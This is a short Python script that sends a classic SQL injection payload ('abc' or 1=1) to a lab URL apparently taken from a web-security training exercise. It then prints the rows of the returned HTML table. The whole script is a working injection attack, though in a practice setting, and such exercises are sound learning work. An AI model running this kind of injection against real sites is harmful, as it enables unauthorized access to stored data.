from urllib import request, parse
import lxml.etree as etree
import lxml.html as lh

data = {"req":"username='hacker'"}
data = {"req":"username='abc' or 1=1"}

data = parse.urlencode(data)
# http://10.0.1.15/sqlinjection/example4/?req=username%3d%27hacker%27
url = "http://10.0.1.15/sqlinjection/example4/?"+data
print(url)
with request.urlopen(url) as resq:
	content = resq.read()

doc = lh.fromstring(content)
tr_elements = doc.xpath("//tr")
for l in tr_elements:
	for e in l:
		print(e.text_content(), end=" | ")
	print("")

